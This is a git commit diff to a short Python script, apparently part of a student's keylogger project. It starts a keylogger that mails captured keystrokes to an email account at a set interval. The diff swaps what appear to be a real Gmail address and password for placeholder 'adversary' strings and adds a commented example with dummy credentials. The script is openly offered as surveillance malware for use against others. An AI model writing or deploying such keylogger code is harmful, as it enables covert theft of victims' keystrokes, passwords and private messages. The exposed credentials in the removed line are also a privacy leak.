70b4786b08c5089864b154c9f9fa0b9b9aaf0886
Aryan Chandrakar <aryan.chandrakar2018@vitstudent.ac.in>
2020-12-05 02:25:17 +0530

    Update okeylogger.py

--- okeylogger.py
+++ okeylogger.py
@@ -1,6 +1,7 @@
 #!/usr/bin/env python
 import keylogger
 
-my_key = keylogger.Keylogger(120, "root.kali2000@gmail.com", "unhuman0174")
+my_key = keylogger.Keylogger(time_duration_after_which_the_mail_is_sent_again_here, "adversary_mail_here", "adversary_mail's_password_here")
+# my_key = keylogger.Keylogger(120, "xyz@abc.come", "passw0rd!")
 my_key.start()
 
